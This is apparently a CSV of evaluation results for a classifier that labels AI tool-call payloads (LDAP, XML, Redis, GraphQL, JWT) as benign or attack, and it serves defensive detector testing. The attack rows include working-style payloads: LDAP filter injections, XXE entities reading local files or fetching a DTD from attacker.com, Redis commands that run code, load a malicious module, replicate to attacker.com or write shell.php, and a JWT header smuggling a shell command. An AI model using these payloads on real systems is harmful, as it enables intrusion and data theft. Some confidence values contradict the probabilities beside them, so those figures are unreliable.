tool_name,payload,true_label,pred_label,confidence,benign_prob,attack_prob,adapted
graphql_query,"{""query"": ""query { __type(name: \""User\"") { fields { name type { name } } } }""}",attack,attack,0.6147782206535339,0.3852217495441437,0.6147782206535339,True
graphql_query,"{""query"": ""query { admin { apiKey secretToken } }""}",attack,attack,0.6630528569221497,0.33694714307785034,0.6630528569221497,True
graphql_query,"{""query"": ""query x($id: String!) { user(id: $id) { name } }"", ""variables"": {""id""",attack,attack,0.6287083625793457,0.3712916076183319,0.6287083625793457,True
graphql_query,"{""query"": ""query { a]};alert(1)// }""}",attack,attack,0.6530725955963135,0.34692737460136414,0.6530725955963135,True
ldap_query,"{""filter"": ""(cn=User 18)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4542921781539917,0.4542921781539917,0.5457078218460083,True
ldap_query,"{""filter"": ""(objectClass=person)"", ""base"": ""dc=example,dc=com""}",benign,attack,0.41091716289520264,0.41091716289520264,0.5890828371047974,True
ldap_query,"{""filter"": ""(uid=user14)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4870644211769104,0.5129355788230896,0.487064391374588,True
ldap_query,"{""filter"": ""(title=Engineer)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.43180930614471436,0.5681906938552856,0.43180936574935913,True
ldap_query,"{""filter"": ""(mail=user12@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.49971920251846313,0.49971920251846313,0.5002807974815369,True
ldap_query,"{""filter"": ""(sn=Smith)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.48221224546432495,0.517787754535675,0.48221227526664734,True
ldap_query,"{""filter"": ""(&(department=IT)(active=true))"", ""base"": ""ou=employees,dc=corp,dc=n",benign,attack,0.6036787629127502,0.39632126688957214,0.6036787629127502,True
ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.6317926645278931,0.36820730566978455,0.6317926645278931,True
ldap_query,"{""filter"": ""(telephoneNumber=*)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,attack,0.43075430393218994,0.43075430393218994,0.5692456960678101,True
ldap_query,"{""filter"": ""(mail=user34@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.49474847316741943,0.5052515268325806,0.4947485029697418,True
ldap_query,"{""filter"": ""(&(department=dept4)(active=true))"", ""base"": ""ou=users,dc=example,dc",benign,attack,0.634701669216156,0.3652983605861664,0.634701669216156,True
ldap_query,"{""filter"": ""(cn=John Doe)"", ""base"": ""ou=contacts,dc=example,dc=com""}",benign,attack,0.46811187267303467,0.46811187267303467,0.5318881273269653,True
ldap_query,"{""filter"": ""(cn=User 28)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.45491427183151245,0.4549142122268677,0.5450857281684875,True
ldap_query,"{""filter"": ""(uid=john)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4183899760246277,0.4183900058269501,0.5816100239753723,True
ldap_query,"{""filter"": ""(mail=user6@example.com)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.46680957078933716,0.46680954098701477,0.5331904292106628,True
ldap_query,"{""filter"": ""(employeeNumber=2)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4813326597213745,0.4813326597213745,0.5186673402786255,True
ldap_query,"{""filter"": ""(uid=user36)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4902617335319519,0.5097382664680481,0.49026167392730713,True
ldap_query,"{""filter"": ""(mail=user16@example.com)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.4919644594192505,0.4919644594192505,0.5080355405807495,True
ldap_query,"{""filter"": ""(employeeNumber=20)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4983288049697876,0.5016711950302124,0.4983287751674652,True
ldap_query,"{""filter"": ""(employeeNumber=22)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.4977368712425232,0.4977369010448456,0.5022631287574768,True
ldap_query,"{""filter"": ""(mail=user32@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.41517460346221924,0.41517457365989685,0.5848253965377808,True
ldap_query,"{""filter"": ""(&(department=dept0)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.6024616956710815,0.39753833413124084,0.6024616956710815,True
ldap_query,"{""filter"": ""(&(department=dept6)(active=true))"", ""base"": ""ou=employees,dc=corp,d",benign,attack,0.401023805141449,0.4010237455368042,0.598976194858551,True
ldap_query,"{""filter"": ""(mail=*@example.com)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.6053838133811951,0.39461618661880493,0.6053838133811951,True
ldap_query,"{""filter"": ""(employeeNumber=0)"", ""base"": ""ou=users,dc=example,dc=com""}",benign,attack,0.4413965940475464,0.4413966238498688,0.5586034059524536,True
ldap_query,"{""filter"": ""(uid=user8)"", ""base"": ""ou=employees,dc=corp,dc=net""}",benign,attack,0.462902307510376,0.4629022479057312,0.537097692489624,True
ldap_query,"{""filter"": ""(employeeNumber=24)"", ""base"": ""ou=people,dc=company,dc=org""}",benign,attack,0.45263671875,0.54736328125,0.4526367783546448,True
ldap_query,"{""filter"": ""\\00*)(uid=admin"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.6292048692703247,0.3707951307296753,0.6292048692703247,True
ldap_query,"{""filter"": ""(uid=admin)"", ""base"": ""ou=admins,dc=corp,dc=net""}",attack,attack,0.4212442636489868,0.4212442636489868,0.5787557363510132,True
ldap_query,"{""filter"": ""(objectClass=*)"", ""base"": ""cn=admin,dc=example,dc=com""}",attack,attack,0.6276102066040039,0.3723897933959961,0.6276102066040039,True
ldap_query,"{""filter"": ""*)(|(objectClass=*))"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.6762217879295349,0.32377827167510986,0.6762217879295349,True
ldap_query,"{""filter"": ""(memberOf=cn=Domain Admins)"", ""base"": ""dc=example,dc=com""}",attack,attack,0.42268872261047363,0.42268866300582886,0.5773112773895264,True
ldap_query,"{""filter"": ""admin)(|(password=*)"", ""base"": ""ou=users,dc=example,dc=com""}",attack,attack,0.657622218132019,0.34237775206565857,0.657622218132019,True
ldap_query,"{""filter"": ""*)(objectClass=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.6559468507766724,0.34405311942100525,0.6559468507766724,True
ldap_query,"{""filter"": "")(cn=*)(|(cn=*"", ""base"": ""dc=corp,dc=net""}",attack,attack,0.6665327548980713,0.3334672451019287,0.6665327548980713,True
ldap_query,"{""filter"": ""*)(uid=*))(|(uid=*"", ""base"": ""dc=example,dc=com""}",attack,attack,0.67169588804245,0.32830411195755005,0.67169588804245,True
parse_xml,"{""xml"": ""<config><item id=\""18\"">value</item></config>""}",benign,attack,0.6026273965835571,0.3973725736141205,0.6026273965835571,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>12</id></data>""}",benign,attack,0.4176831841468811,0.4176831841468811,0.5823168158531189,True
parse_xml,"{""xml"": ""<users><user id=\""1\""><name>John</name></user></users>""}",benign,attack,0.6144615411758423,0.3855384588241577,0.6144615411758423,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>2</id></data>""}",benign,attack,0.40845996141433716,0.40845993161201477,0.5915400385856628,True
parse_xml,"{""xml"": ""<users><user id=\""10\""><name>User10</name></user></users>""}",benign,attack,0.4180458188056946,0.41804584860801697,0.5819541811943054,True
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 22</message></response>""}",benign,attack,0.6323593258857727,0.36764073371887207,0.6323593258857727,True
parse_xml,"{""xml"": ""<order id=\""8\""><status>pending</status></order>""}",benign,attack,0.405798077583313,0.405798077583313,0.594201922416687,True
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 28</message></response>""}",benign,attack,0.6317527294158936,0.36824727058410645,0.6317527294158936,True
parse_xml,"{""xml"": ""<note><to>User</to><from>Admin</from><body>Hello</body></note>""}",benign,attack,0.6477265357971191,0.35227349400520325,0.6477265357971191,True
parse_xml,"{""xml"": ""<order id=\""24\""><status>pending</status></order>""}",benign,attack,0.41004687547683716,0.41004687547683716,0.5899531245231628,True
parse_xml,"{""xml"": ""<feed><entry><title>Hello</title></entry></feed>""}",benign,attack,0.44840437173843384,0.44840434193611145,0.5515956282615662,True
parse_xml,"{""xml"": ""<order><id>123</id><items><item>Book</item></items></order>""}",benign,attack,0.4966391921043396,0.5033608078956604,0.4966391921043396,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><item>test</item></data>""}",benign,attack,0.6019085645675659,0.3980914056301117,0.6019085645675659,True
parse_xml,"{""xml"": ""<users><user id=\""16\""><name>User16</name></user></users>""}",benign,attack,0.40849757194519043,0.40849757194519043,0.5915024280548096,True
parse_xml,"{""xml"": ""<config><item id=\""30\"">value</item></config>""}",benign,attack,0.4058690071105957,0.4058689773082733,0.5941309928894043,True
parse_xml,"{""xml"": ""<users><user id=\""26\""><name>User26</name></user></users>""}",benign,attack,0.4074193835258484,0.4074193835258484,0.5925806164741516,True
parse_xml,"{""xml"": ""<products><product><name>Widget</name><price>9.99</price></product></pr",benign,attack,0.48293936252593994,0.5170606374740601,0.48293933272361755,True
parse_xml,"{""xml"": ""<config><item id=\""0\"">value</item></config>""}",benign,attack,0.619676947593689,0.3803230822086334,0.619676947593689,True
parse_xml,"{""xml"": ""<config><item id=\""6\"">value</item></config>""}",benign,attack,0.6043252348899841,0.3956747353076935,0.6043252348899841,True
parse_xml,"{""xml"": ""<response status=\""ok\""><message>Success</message></response>""}",benign,attack,0.6522541642189026,0.3477458953857422,0.6522541642189026,True
parse_xml,"{""xml"": ""<config><setting name=\""debug\"">false</setting></config>""}",benign,attack,0.6609715223312378,0.3390285074710846,0.6609715223312378,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><data><id>4</id></data>""}",benign,attack,0.41075414419174194,0.41075411438941956,0.5892458558082581,True
parse_xml,"{""xml"": ""<config><item id=\""20\"">value</item></config>""}",benign,attack,0.4010545015335083,0.4010545015335083,0.5989454984664917,True
parse_xml,"{""xml"": ""<response code=\""200\""><message>OK 14</message></response>""}",benign,attack,0.6278678774833679,0.3721321225166321,0.6278678774833679,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'file:///et",attack,attack,0.6940029263496399,0.3059971034526825,0.6940029263496399,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE data [<!ENTITY xxe SYSTEM 'http://169.",attack,attack,0.6386898756027222,0.3613101541996002,0.6386898756027222,True
parse_xml,"{""xml"": ""<!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode",attack,attack,0.6888470649719238,0.31115296483039856,0.6888470649719238,True
parse_xml,"{""xml"": ""<credentials><username>admin</username><password>secret</password></cre",attack,attack,0.6320208311080933,0.3679791986942291,0.6320208311080933,True
parse_xml,"{""xml"": ""<config><apiKey>sk-xxx</apiKey></config>""}",attack,attack,0.6173527836799622,0.38264718651771545,0.6173527836799622,True
parse_xml,"{""xml"": ""<?xml version=\""1.0\""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/",attack,attack,0.6961817145347595,0.30381831526756287,0.6961817145347595,True
parse_xml,"{""xml"": ""<!DOCTYPE :[ <!ENTITY x SYSTEM \""file:///dev/random\""> ]><x>&x;</x>""}",attack,attack,0.6843338012695312,0.31566622853279114,0.6843338012695312,True
parse_xml,"{""xml"": ""<!DOCTYPE root [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%d",attack,attack,0.6758511662483215,0.32414883375167847,0.6758511662483215,True
redis_command,"{""command"": ""GET"", ""args"": [""session:18""]}",benign,attack,0.49941378831863403,0.500586211681366,0.49941378831863403,True
redis_command,"{""command"": ""GET"", ""args"": [""session:22""]}",benign,attack,0.4972490072250366,0.4972490072250366,0.5027509927749634,True
redis_command,"{""command"": ""HGET"", ""args"": [""user:28"", ""name""]}",benign,attack,0.4907955527305603,0.5092044472694397,0.4907955527305603,True
redis_command,"{""command"": ""HSET"", ""args"": [""user:1"", ""email"", ""john@example.com""]}",benign,attack,0.4810161590576172,0.4810160994529724,0.5189838409423828,True
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:14"", ""3600""]}",benign,attack,0.46355140209198,0.53644859790802,0.4635513722896576,True
redis_command,"{""command"": ""HGET"", ""args"": [""user:6"", ""name""]}",benign,attack,0.49362295866012573,0.49362295866012573,0.5063770413398743,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter""]}",benign,attack,0.44286882877349854,0.4428688585758209,0.5571311712265015,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:38""]}",benign,attack,0.49978524446487427,0.49978524446487427,0.5002147555351257,True
redis_command,"{""command"": ""SADD"", ""args"": [""tags"", ""python""]}",benign,attack,0.43497592210769653,0.43497592210769653,0.5650240778923035,True
redis_command,"{""command"": ""ZADD"", ""args"": [""leaderboard"", ""100"", ""user1""]}",benign,attack,0.4795129895210266,0.5204870104789734,0.479513019323349,True
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:0"", ""task0""]}",benign,attack,0.4833148717880249,0.4833149313926697,0.5166851282119751,True
redis_command,"{""command"": ""HGET"", ""args"": [""user:10"", ""name""]}",benign,attack,0.49978673458099365,0.4997867941856384,0.5002132654190063,True
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue"", ""task1""]}",benign,attack,0.47757428884506226,0.47757428884506226,0.5224257111549377,True
redis_command,"{""command"": ""HGET"", ""args"": [""user:1"", ""name""]}",benign,attack,0.4810367822647095,0.4810367524623871,0.5189632177352905,True
redis_command,"{""command"": ""SET"", ""args"": [""cache:page"", ""data""]}",benign,attack,0.47828352451324463,0.5217164754867554,0.478283554315567,True
redis_command,"{""command"": ""GET"", ""args"": [""session:123""]}",benign,attack,0.4873392581939697,0.4873392879962921,0.5126607418060303,True
redis_command,"{""command"": ""GET"", ""args"": [""session:2""]}",benign,attack,0.46419817209243774,0.46419820189476013,0.5358018279075623,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:20""]}",benign,attack,0.4955899715423584,0.4955900013446808,0.5044100284576416,True
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:36"", ""data""]}",benign,attack,0.4462089538574219,0.5537910461425781,0.4462089538574219,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:30""]}",benign,attack,0.4872296452522278,0.5127703547477722,0.4872296154499054,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:32""]}",benign,attack,0.4793820381164551,0.4793820381164551,0.5206179618835449,True
redis_command,"{""command"": ""SET"", ""args"": [""cache:page:4"", ""data""]}",benign,attack,0.4675745368003845,0.5324254631996155,0.4675745666027069,True
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:3"", ""task8""]}",benign,attack,0.4993715286254883,0.4993715286254883,0.5006284713745117,True
redis_command,"{""command"": ""LPUSH"", ""args"": [""queue:1"", ""task26""]}",benign,attack,0.49694448709487915,0.5030555129051208,0.49694445729255676,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:12""]}",benign,attack,0.4900742173194885,0.49007418751716614,0.5099257826805115,True
redis_command,"{""command"": ""INCR"", ""args"": [""counter:24""]}",benign,attack,0.4979371428489685,0.4979371428489685,0.5020628571510315,True
redis_command,"{""command"": ""TTL"", ""args"": [""session:123""]}",benign,attack,0.48456084728240967,0.48456087708473206,0.5154391527175903,True
redis_command,"{""command"": ""EXPIRE"", ""args"": [""temp:16"", ""3600""]}",benign,attack,0.482352077960968,0.517647922039032,0.4823521077632904,True
redis_command,"{""command"": ""EXPIRE"", ""args"": [""cache:key"", ""3600""]}",benign,attack,0.4990062117576599,0.5009937882423401,0.4990062415599823,True
redis_command,"{""command"": ""GET"", ""args"": [""session:34""]}",benign,attack,0.4927821755409241,0.4927821755409241,0.5072178244590759,True
redis_command,"{""command"": ""DEBUG"", ""args"": [""SEGFAULT""]}",attack,attack,0.41541820764541626,0.41541820764541626,0.5845817923545837,True
redis_command,"{""command"": ""KEYS"", ""args"": [""*""]}",attack,attack,0.41839516162872314,0.41839516162872314,0.5816048383712769,True
redis_command,"{""command"": ""EVAL"", ""args"": [""return os.execute('id')"", ""0""]}",attack,attack,0.6660690903663635,0.3339309096336365,0.6660690903663635,True
redis_command,"{""command"": ""MODULE"", ""args"": [""LOAD"", ""/tmp/malicious.so""]}",attack,attack,0.637467086315155,0.36253291368484497,0.637467086315155,True
redis_command,"{""command"": ""CONFIG"", ""args"": [""GET"", ""requirepass""]}",attack,attack,0.6028097867965698,0.3971902132034302,0.6028097867965698,True
redis_command,"{""command"": ""FLUSHALL"", ""args"": []}",attack,attack,0.4074748158454895,0.4074747562408447,0.5925251841545105,True
redis_command,"{""command"": ""SLAVEOF"", ""args"": [""attacker.com"", ""6379""]}",attack,attack,0.478718638420105,0.4787185788154602,0.521281361579895,True
redis_command,"{""command"": ""INFO"", ""args"": []}",attack,attack,0.4421766996383667,0.4421766698360443,0.5578233003616333,True
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dir"", ""/var/www/html""]}",attack,attack,0.4130058288574219,0.41300585865974426,0.5869941711425781,True
redis_command,"{""command"": ""CONFIG"", ""args"": [""SET"", ""dbfilename"", ""shell.php""]}",attack,attack,0.6187093257904053,0.3812907040119171,0.6187093257904053,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidGVzdCJ9.sig""}",benign,attack,0.4892376661300659,0.4892376959323883,0.5107623338699341,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4963908791542053,0.5036091208457947,0.49639084935188293,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49254894256591797,0.49254894256591797,0.507451057434082,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49636638164520264,0.5036336183547974,0.49636638164520264,True
verify_jwt,"{""token"": ""eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiSmFuZSJ9.sig""}",benign,attack,0.45635491609573364,0.45635488629341125,0.5436450839042664,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4985805153846741,0.5014194846153259,0.4985805153846741,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.48687201738357544,0.48687198758125305,0.5131279826164246,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49041473865509033,0.5095852613449097,0.49041470885276794,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4997764825820923,0.4997765123844147,0.5002235174179077,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4974457621574402,0.4974457323551178,0.5025542378425598,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjN9.sig""}",benign,attack,0.4742288589477539,0.4742288291454315,0.5257711410522461,True
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJhcHAiLCJzdWIiOiJ1c2Vy",benign,attack,0.47388023138046265,0.4738802909851074,0.5261197686195374,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49837756156921387,0.49837756156921387,0.5016224384307861,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4888746738433838,0.4888746738433838,0.5111253261566162,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.48655831813812256,0.48655828833580017,0.5134416818618774,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.49918895959854126,0.49918892979621887,0.5008110404014587,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFt",benign,attack,0.4793940782546997,0.4793940782546997,0.5206059217453003,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4950883388519287,0.4950883686542511,0.5049116611480713,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4912865161895752,0.4912864863872528,0.5087134838104248,True
verify_jwt,"{""token"": ""eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4996826648712158,0.4996826648712158,0.5003173351287842,True
verify_jwt,"{""token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXyIgfQ.signature",benign,attack,0.4955984354019165,0.5044015645980835,0.49559837579727173,True
verify_jwt,"{""token"": ""eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Inwgc2xlZXAgMTAgfCJ9.eyJy",attack,attack,0.42647355794906616,0.4264734983444214,0.5735264420509338,True
